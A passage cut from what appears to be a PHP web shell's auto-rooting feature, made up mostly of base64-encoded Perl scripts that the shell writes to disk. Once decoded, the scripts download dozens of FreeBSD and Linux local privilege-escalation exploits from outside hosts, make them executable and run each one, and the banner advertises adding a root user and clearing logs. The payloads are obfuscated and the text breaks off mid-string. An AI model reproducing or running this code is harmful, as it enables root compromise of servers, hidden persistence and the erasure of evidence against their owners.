Qga2VybmVsIDogfEJTRC1hcnF8ICAgICAgICAgICAgICAgICAgICB8XG4iOyANCnByaW50ICJ8LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS0tLS0tLS18XG4iOyANCnNsZWVwKDIpOyANCnByaW50ICJcblsrXSBUZXN0aW5nIGJzZCB4cGwncyBwbGVhc2Ugd2FpdC5cbiI7IA0KcHJpbnQgIlt+XSBNZWFud2hpbGUgc21va2UgYSBjaWdhcmV0IFhEICg6XG4iOyANCnNsZWVwKDIpOyANCnN5c3RlbSgibWtkaXIgQlNEO2NkIGJzZC8iKTsgDQoNCnN5c3RlbSgid2dldCBodHRwOi8vMTg0LjIyLjIxOS41MC94cGwvRnJlZUJTRC82LjEtMDkuYyIpOyANCnN5c3RlbSgiZ2NjIC1vIDYuMS0wOSA2LjEtMDkuYyAtbHB0aHJlYWQiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyA2LjEtMDkiKTsgDQpzeXN0ZW0oIi4vNi4xLTA5Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9GcmVlQlNELzYuNCIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDYuNCIpOyANCnN5c3RlbSgiLi82LjQiKTsgDQpzbGVlcCgxKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovLzE4NC4yMi4yMTkuNTAveHBsL0ZyZWVCU0QvNy4xLTA4LmMiKTsgDQpzeXN0ZW0oImdjYyAtbyA3LjEtMDggNy4xLTA4LmMgIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgNy4xLTA4Iik7IA0Kc3lzdGVtKCIuLzcuMS0wOCIpOyANCnNsZWVwKDEpOyANCnN5c3RlbSgid2dldCBodHRwOi8vMTg0LjIyLjIxOS41MC94cGwvRnJlZUJTRC8yMDEwIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAxMCIpOyANCnN5c3RlbSgiLi8yMDEwIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9GcmVlQlNEL2Eub3V0Iik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgYS5vdXQiKTsgDQpzeXN0ZW0oIi4vYS5vdXQiKTsgDQpzbGVlcCgxKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovLzE4NC4yMi4yMTkuNTAveHBsL0ZyZWVCU0QvY2Via21vdW50Iik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgY2Via21vdW50Iik7IA0Kc3lzdGVtKCIuL2NlYmttb3VudCIpOyANCnNsZWVwKDEpOyANCnN5c3RlbSgid2dldCBodHRwOi8vMTg0LjIyLjIxOS41MC94cGwvRnJlZUJTRC9jdmUtMjAxMC0yNjkzIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgY3ZlLTIwMTAtMjY5MyIpOyANCnN5c3RlbSgiLi9jdmUtMjAxMC0yNjkzIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9GcmVlQlNELzYuMS0wOS5jIik7IA0Kc3lzdGVtKCJnY2MgLW8gNi4xLTA5IDYuMS0wOS5jIC1scHRocmVhZCIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDYuMS0wOSIpOyANCnN5c3RlbSgiLi82LjEtMDkiKTsgDQpzbGVlcCgxKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovLzE4NC4yMi4yMTkuNTAveHBsL0ZyZWVCU0QvZnJlZTcuc2giKTsgDQpzeXN0ZW0oImNobW9kIDc3NyBmcmVlNy5zaCIpOyANCnN5c3RlbSgiLi9mcmVlNy5zaCIpOyANCnNsZWVwKDEpOyANCnN5c3RlbSgid2dldCBodHRwOi8vMTg0LjIyLjIxOS41MC94cGwvRnJlZUJTRC9sIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgbCIpOyANCnN5c3RlbSgiLi9sIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9GcmVlQlNEL21hc3RlciIpOyANCnN5c3RlbSgiY2htb2QgNzc3IG1hc3RlciIpOyANCnN5c3RlbSgiLi9tYXN0ZXIiKTsgDQpzbGVlcCgxKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovLzE4NC4yMi4yMTkuNTAveHBsL0ZyZWVCU0QvdzAwdC5zby4xLjAiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyB3MDB0LnNvLjEuMCIpOyANCnN5c3RlbSgiLi93MDB0LnNvLjEuMCIpOyANCmV4aXQoMCk7IA0KfSANCg0KLy9FT0ZfIA0KLy8yMDEzIA0KLy9Qcml2OCBWZXJzaW9uICANCg0KPz4=";
                                            file_put_contents("r00t.php",base64_decode($rroter));
                                            echo "<script>alert('Auto R00ting Created'); hideAll();</script>";
                                            die();
                                        }
                                        elseif ( $pilih == 'rrot' ){
                                            $perlrot = "IyEvdXNyL2Jpbi9wZXJsDQpwcmludCAiIz1bK109PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1bK109I1xuIjsNCnByaW50ICJ8ICAgICAgICAgICAgICAgQXV0b3Jvb3QgQnkgR2FiYnkgICAgICAgICAgICAgICAgICB8XG4iOw0KcHJpbnQgInwgVGhhbmtzIHRvIDogWW9neWFjYXJkZXJsaW5rIC0gU3VyYWJheWEgQmxhY2toYXQgIHxcbiI7DQpwcmludCAifCAgICAgICAgICAgICAgIC0gVGhlIENyb3dzIENyZXcgLSAgICAgICAgICAgICAgICAgfFxuIjsNCnByaW50ICIjPT09PT09PT09PT09PT09PT09PT09WyBVc2FnZSBdPT09PT09PT09PT09PT09PT09PT0jXG4iOw0KcHJpbnQgInwgR2V0IFJvb3QgICAgICAgICA9IHBlcmwgJDAgcm9vdCAgICAgICAgICAgICAgIHxcbiI7DQpwcmludCAifCBDbGVhciBMb2NhbCBSb290ID0gcGVybCAkMCBkZWwgICAgICAgICAgICAgICAgfFxuIjsNCnByaW50ICJ8IEFkZCBVc2VyIFJvb3QgICAgPSBwZXJsICQwIGFkZCAgICAgICAgICAgICAgICB8XG4iOw0KcHJpbnQgInwgQ2xlYXIgTG9nICAgICAgICA9IHBlcmwgJDAgcm0gICAgICAgICAgICAgICAgIHxcbiI7DQpwcmludCAifD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09fFxuIjsNCnByaW50ICJ8IENvbnRhY3QgTWUgOiBnYWJieVthdF10aGVjcm93c2NyZXcub3JnICAgICAgICAgICB8XG4iOw0KcHJpbnQgIiM9WytdPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVsrXSNcbiI7DQppZiAoJEFSR1ZbMF0gPX4gInJvb3QiICkgDQp7DQpwcmludCAiU2lhcGluIHJva29rIG1hIGtvcGkgZHVsdSBtYXMgbWJsbyA6UCBcbiI7DQpwcmludCAiT2ssLi4gTGV0cyBzdGFydC4uLiBTYXBhcmF0b3MgQmxhbmsuLi4uISEhIFxuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzEtMiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMS0yIik7DQpzeXN0ZW0oIi4vMS0yIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzEtMyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMS0zIik7DQpzeXN0ZW0oIi4vMS0zIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzEtNCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMS00Iik7DQpzeXN0ZW0oIi4vMS00Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4xOC0zNzQuMTIuMS5lbDUtMjAxMiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjE4LTM3NC4xMi4xLmVsNS0yMDEyIik7DQpzeXN0ZW0oIi4vMi42LjE4LTM3NC4xMi4xLmVsNS0yMDEyIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzEwIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxMCIpOw0Kc3lzdGVtKCIuLzEwIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzExIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxMSIpOw0Kc3lzdGVtKCIuLzExIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzEyIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxMiIpOw0Kc3lzdGVtKCIuLzEyIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAxNCIpOw0Kc3lzdGVtKCIuLzE0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE1LnNoIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxNS5zaCIpOw0Kc3lzdGVtKCIuLzE1LnNoIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE1MTUwIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxNTE1MCIpOw0Kc3lzdGVtKCIuLzE1MTUwIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE1MjAwIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxNTIwMCIpOw0Kc3lzdGVtKCIuLzE1MjAwIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE2Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAxNiIpOw0Kc3lzdGVtKCIuLzE2Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE2LTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDE2LTEiKTsNCnN5c3RlbSgiLi8xNi0xIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE4Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAxOCIpOw0Kc3lzdGVtKCIuLzE4Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE4LTUiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDE4LTUiKTsNCnN5c3RlbSgiLi8xOC01Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIiKTsNCnN5c3RlbSgiLi8yIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzItMSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi0xIik7DQpzeXN0ZW0oIi4vMi0xIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzItNi0zMi00Ni0yMDExIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLTYtMzItNDYtMjAxMSIpOw0Kc3lzdGVtKCIuLzItNi0zMi00Ni0yMDExIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzItNi0zNyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi02LTM3Iik7DQpzeXN0ZW0oIi4vMi02LTM3Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzItNi05LTIwMDUiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDItNi05LTIwMDUiKTsNCnN5c3RlbSgiLi8yLTYtOS0yMDA1Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzItNi05LTIwMDYiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDItNi05LTIwMDYiKTsNCnN5c3RlbSgiLi8yLTYtOS0yMDA2Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuMzQtMjAxMUV4cGxvaXQxIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLTYtOS0yMDA2Iik7DQpzeXN0ZW0oIi4vMi02LTktMjAwNiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjQuMjEtMjAwNiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi02LTktMjAwNiIpOw0Kc3lzdGVtKCIuLzItNi05LTIwMDYiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi40LjM2LjkyLjYuMjcuNSAtIDIwMDggTG9jYWwgcm9vdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi40LjM2LjkyLjYuMjcuNSAtIDIwMDggTG9jYWwgcm9vdCIpOw0Kc3lzdGVtKCIuLzIuNC4zNi45Mi42LjI3LjUgLSAyMDA4IExvY2FsIHJvb3QiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTE2NC0yMDEwIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMTgtMTY0LTIwMTAiKTsNCnN5c3RlbSgiLi8yLjYuMTgtMTY0LTIwMTAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTE5NCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjE4LTE5NCIpOw0Kc3lzdGVtKCIuLzIuNi4xOC0xOTQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTE5NC4xLTIwMTAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0xOTQuMS0yMDEwIik7DQpzeXN0ZW0oIi4vMi42LjE4LTE5NC4xLTIwMTAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTE5NC4yLTIwMTAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0xOTQuMi0yMDEwIik7DQpzeXN0ZW0oIi4vMi42LjE4LTE5NC4yLTIwMTAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTI3NC0yMDExIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMTgtMjc0LTIwMTEiKTsNCnN5c3RlbSgiLi8yLjYuMTgtMjc0LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTYteDg2LTIwMTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC02LXg4Ni0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjE4LTYteDg2LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjItaG9vbHlzaGl0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMi1ob29seXNoaXQiKTsNCnN5c3RlbSgiLi8yLjYuMi1ob29seXNoaXQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIwIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMjAiKTsNCnN5c3RlbSgiLi8yLjYuMjAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIwLTIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yMC0yIik7DQpzeXN0ZW0oIi4vMi42LjIwLTIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIyIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMjIiKTsNCnN5c3RlbSgiLi8yLjYuMjIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIyLTIwMDgiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yMi0yMDA4Iik7DQpzeXN0ZW0oIi4vMi42LjIyLTIwMDgiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIyLTYtODZfNjQtMjAwNyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjIyLTYtODZfNjQtMjAwNyIpOw0Kc3lzdGVtKCIuLzIuNi4yMi02LTg2XzY0LTIwMDciKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIzLTIuNi4yNCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjIzLTIuNi4yNCIpOw0Kc3lzdGVtKCIuLzIuNi4yMy0yLjYuMjQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIzLTIuNi4yNF8yIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMjMtMi42LjI0XzIiKTsNCnN5c3RlbSgiLi8yLjYuMjMtMi42LjI0XzIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIzLTIuNi4yNyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjIzLTIuNi4yNyIpOw0Kc3lzdGVtKCIuLzIuNi4yMy0yLjYuMjciKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjI0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMjQiKTsNCnN5c3RlbSgiLi8yLjYuMjQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjI3LjctZ2VuZXJpIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMjcuNy1nZW5lcmkiKTsNCnN5c3RlbSgiLi8yLjYuMjcuNy1nZW5lcmkiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjI4LTIwMTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yOC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjI4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjMyLTQ2LjEuQkhzbXAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4zMi00Ni4xLkJIc21wIik7DQpzeXN0ZW0oIi4vMi42LjMyLTQ2LjEuQkhzbXAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjMzIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzMiKTsNCnN5c3RlbSgiLi8yLjYuMzMiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjMzLTIwMTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjM0LTIwMTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4zNC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjM0LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjM0LTIwMTFFeHBsb2l0MSIpOw0Kc3lzdGV